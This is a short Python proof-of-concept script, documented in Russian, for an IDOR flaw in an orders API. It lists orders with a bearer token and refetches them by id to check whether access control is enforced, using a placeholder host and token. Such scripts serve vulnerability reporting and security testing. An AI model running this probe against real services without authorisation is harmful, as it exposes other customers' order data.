"""
Proof of Concept: IDOR в GET /api/orders/{id}

Авторизованный продавец может получить данные заказа,
который ему не принадлежит. Сервер не проверяет владельца ресурса.
"""

import requests

BASE_URL = "https://X-X-X.com"
TOKEN = "XXX"
HEADERS = {"Authorization": f"Bearer {TOKEN}"}


def get_all_orders():
    all_orders = []
    page = 1
    limit = 100
    while True:
        resp = requests.get(
            f"{BASE_URL}/api/orders",
            headers=HEADERS,
            params={"page": page, "limit": limit},
            timeout=10,
        )
        if resp.status_code != 200:
            break
        data = resp.json()
        orders = data.get("data", [])
        if not orders:
            break
        all_orders.extend(orders)
        pagination = data.get("pagination", {})
        if page >= pagination.get("totalPages", 1):
            break
        page += 1
    return all_orders


def fetch_order(order_id):
    return requests.get(
        f"{BASE_URL}/api/orders/{order_id}",
        headers=HEADERS,
        timeout=5,
    )


def check_idor():
    orders = get_all_orders()
    return [
        (order["id"], fetch_order(order["id"]).status_code)
        for order in orders[:5]
    ]


if __name__ == "__main__":
    check_idor()
